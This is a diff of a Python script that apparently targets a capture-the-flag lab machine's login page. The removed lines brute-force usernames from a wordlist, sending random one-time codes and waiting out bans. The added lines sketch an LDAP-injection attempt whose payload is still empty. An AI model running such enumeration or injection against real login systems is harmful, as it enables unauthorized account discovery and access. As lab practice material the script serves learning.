@@ -2,43 +2,35 @@
 # -*- encoding:utf-8 -*-
 
 import random
-import requests
 import time
-import json
+from urllib.parse import quote_plus as urlencode
+import requests
 
-debug = False
-
+debug = True
 
 if debug:
     host = '127.0.0.1:8181'
-    dictfile = '/usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
 else:
     host = '10.10.10.122'
-    dictfile = '/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
-
 
 endp = '/login.php'
 finaluri = 'http://' + host + endp
 
 postparam = {"inputUsername": None, "inputOTP": None}
 
-f = open(dictfile, 'r')
+# Assume the LDAP Query is: `(&(username=blahblah)(token=blahblah))`
 
-usrname = f.readline().strip()
-while usrname != '':
-    postparam["inputUsername"] = usrname
-    postparam["inputOTP"] = str(random.randint(10000000, 99999999))
-    sess = requests.session()
-    # print("- [+] Payload: " + json.dumps(postparam))
-    try:
-        sess.get('http://' + host + '/')
-        r = sess.post(finaluri, data=postparam)
-        if 'not found' in r.text.lower():
-            pass
-        else:
-            print("- [+] Username: " + postparam["inputUsername"])
-        usrname = f.readline().strip()
-    except requests.exceptions.ConnectionError as ce:
-        print("Get Banned! Wait 6 mins.")
-        time.sleep(360)
-        continue
+usrname = ''
+postparam["inputUsername"] = urlencode(usrname)
+postparam["inputOTP"] = str(random.randint(10000000, 99999999))
+sess = requests.session()
+try:
+    sess.get('http://' + host + '/')
+    r = sess.post(finaluri, data=postparam)
+    if 'cannot login' in r.text.lower():
+        pass
+    else:
+        pass
+except requests.exceptions.ConnectionError as ce:
+    print("Get Banned! Wait 6 mins.")
+    time.sleep(360)
